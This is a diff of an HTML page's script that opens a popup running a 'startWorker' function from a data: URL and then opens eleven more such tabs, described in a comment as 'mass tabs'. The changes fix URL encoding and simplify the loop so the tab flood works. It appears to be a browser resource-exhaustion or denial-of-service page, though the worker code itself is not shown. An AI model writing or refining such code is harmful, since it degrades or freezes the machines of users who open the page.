@@ -20,11 +20,11 @@
         }
 
         function openTabs() {
-            let urls = ["data:text/html,<script>(" + startWorker.toString() + ")()</script>"];
+            let url = "data:text/html,<script>(" + encodeURIComponent(startWorker.toString()) + ")()</script>";
             let tabs = [];
             
             // Open first tab manually
-            let firstTab = window.open(urls[0]);
+            let firstTab = window.open(url);
             if (!firstTab) {
                 alert("Popup blocked! Click the page and try again.");
                 return;
@@ -34,14 +34,12 @@
 
             // Use first tab to open additional tabs
             setTimeout(() => {
-                tabs.forEach(tab => {
-                    for (let i = 0; i < 11; i++) {
-                        let newTab = tab.window.open(urls[0]);
-                        if (newTab) {
-                            tabs.push(newTab);
-                        }
+                for (let i = 0; i < 11; i++) {
+                    let newTab = window.open(url);
+                    if (newTab) {
+                        tabs.push(newTab);
                     }
-                });
+                }
             }, 500); // Small delay before triggering mass tabs
         }
 
@@ -50,3 +48,4 @@
     </script>
 </body>
 </html>
+
